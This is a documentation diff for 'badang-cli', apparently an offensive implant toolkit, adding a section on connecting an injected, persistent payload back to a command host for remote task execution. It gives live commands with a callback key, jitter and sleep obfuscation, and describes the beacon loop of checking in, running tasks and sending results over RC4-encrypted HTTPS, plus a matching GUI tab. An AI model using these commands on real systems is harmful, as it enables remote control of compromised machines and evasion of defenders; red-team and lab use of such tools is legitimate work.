@@ -403,6 +403,25 @@ badang-cli persist --method registry --name "UpdateService" --payload encrypted.
 
 ---
 
+## 12. Communications
+
+After injecting a payload with persistence, connect it back for remote task execution.
+
+```bash
+# Dry run — shows the callback sequence
+badang-cli comms --channel https --host 10.0.0.1 --comms-port 443
+
+# Live — connect and enter callback loop
+badang-cli comms --host 10.0.0.1 --comms-key aabbccddee112233 --interval 30000 --jitter 20 -x -c
+
+# With sleep obfuscation during callback intervals
+badang-cli comms --host 10.0.0.1 --comms-key aabbccddee112233 --sleep-obfs -x -c
+```
+
+The callback loop: check in → receive tasks → execute → send results → sleep with jitter → repeat. Transport is HTTPS via WinINet with RC4 encryption. Automatic exponential backoff on connection errors.
+
+---
+
 ## GUI Workflow
 
 The GUI (`badang.exe`) provides the same capabilities with a visual interface:
@@ -416,6 +435,7 @@ The GUI (`badang.exe`) provides the same capabilities with a visual interface:
 7. **Syscall** tab — direct or indirect syscall invocation
 8. **Stack / Sleep** tabs — runtime evasion demos
 9. **Persist** tab — select persistence method, configure, execute
+10. **Comms** tab — configure callback channel, transport parameters, execute
 
 The top bar shows the current mode (Dry Run / Live) and the Confirm checkbox. The log panel at the bottom shows all output with color-coded severity.
 
